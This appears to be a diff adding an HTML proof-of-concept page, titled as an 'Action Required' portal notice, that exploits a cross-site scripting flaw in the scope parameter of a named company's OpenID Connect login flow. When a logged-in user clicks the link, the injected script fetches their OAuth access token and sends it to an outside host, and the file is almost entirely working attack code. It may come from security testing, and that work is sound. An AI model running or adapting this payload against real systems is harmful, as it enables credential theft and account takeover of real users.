@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>2c8 Portal — Action Required</title>
+    <style>
+        body { font-family: monospace; margin: 2em; background: #1a1a1a; color: #0f0; }
+        a { color: #f90; font-size: 1.1em; }
+        .info { color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>XSS Token Theft PoC</h1>
+    <p class="info">Click the link below while logged into the 2c8 portal.</p>
+    <p><a id="xss-link" href="#">Loading...</a></p>
+    <pre id="output">Waiting...</pre>
+
+    <script>
+    var EXFIL = 'https://baalstorm.se/token.html';
+
+    var payload = "fetch('/portal/api/v2/oauth/token?refresh=true')"
+        + ".then(function(r){return r.json()})"
+        + ".then(function(d){"
+        + "  new Image().src='" + EXFIL + "?token='+encodeURIComponent(d.access_token);"
+        + "  document.write('<h1>Done</h1><p>Token sent to attacker server.</p>')"
+        + "})"
+        + ".catch(function(e){"
+        + "  document.write('<h1>Failed</h1><p>'+e.message+'</p>')"
+        + "})";
+
+    var xssUrl = "https://idp.pt.2c8.com/auth/realms/2c8/protocol/openid-connect/auth"
+        + "?response_type=code"
+        + "&client_id=2c8-portal"
+        + "&redirect_uri=" + encodeURIComponent("https://lic.pt.2c8.com/portal/api/v2/oauth/callback")
+        + "&scope=" + encodeURIComponent("openid<img src=x onerror=\"" + payload + "\">")
+        + "&state=test"
+        + "&nonce=test"
+        + "&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
+        + "&code_challenge_method=S256";
+
+    document.getElementById('xss-link').href = xssUrl;
+    document.getElementById('xss-link').textContent = "Click here";
+    </script>
+</body>
+</html>
